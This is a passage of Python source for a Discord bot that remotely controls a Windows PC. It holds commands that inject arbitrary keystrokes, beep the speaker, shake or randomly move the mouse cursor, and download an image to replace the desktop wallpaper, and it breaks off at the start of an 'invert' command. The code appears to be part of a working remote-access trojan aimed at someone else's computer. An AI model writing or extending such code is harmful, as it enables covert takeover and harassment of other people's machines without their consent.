@bot.command(name="type")
async def type_cmd(ctx, *, text):
    try:
        try:
            import keyboard
            keyboard.write(text, delay=0.02)
        except Exception:
            pyautogui.write(text, interval=0.02)
        await ctx.reply(f"typed `{text[:50]}...`")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="beep")
async def beep(ctx, seconds: int = 3):
    try:
        seconds = max(1, min(seconds, 30))
        def _b():
            end = time.time() + seconds
            while time.time() < end:
                ctypes.windll.kernel32.Beep(1000, 200)
        threading.Thread(target=_b, daemon=True).start()
        await ctx.reply(f"🔊 beeping {seconds}s")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="shake")
async def shake(ctx, seconds: int = 3):
    try:
        seconds = max(1, min(seconds, 20))
        def _s():
            start = time.time()
            while time.time() - start < seconds:
                x, y = pyautogui.position()
                pyautogui.moveTo(x + random.randint(-40, 40), y + random.randint(-40, 40), duration=0.02)
        threading.Thread(target=_s, daemon=True).start()
        await ctx.reply(f"shaking {seconds}s")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="move")
async def move(ctx, times: int = 20):
    try:
        sw, sh = pyautogui.size()
        for _ in range(times):
            pyautogui.moveTo(random.randint(0, sw-1), random.randint(0, sh-1), duration=0.1)
        await ctx.reply(f"moved cursor {times}x")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="wallpaper")
async def wallpaper(ctx, url: str):
    try:
        data = download_bytes(url, 20)
        ext = os.path.splitext(urllib.parse.urlparse(url).path)[1] or ".png"
        if ext.lower() not in (".png", ".jpg", ".jpeg", ".bmp"):
            ext = ".png"
        wp = os.path.join(WORK_DIR, f"wall{ext}")
        open(wp, "wb").write(data)
        img = Image.open(wp).convert("RGB")
        bmp = os.path.join(WORK_DIR, "wall.bmp")
        img.save(bmp, "BMP")
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bmp, 3)
        await ctx.reply("wallpaper set")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="invert")
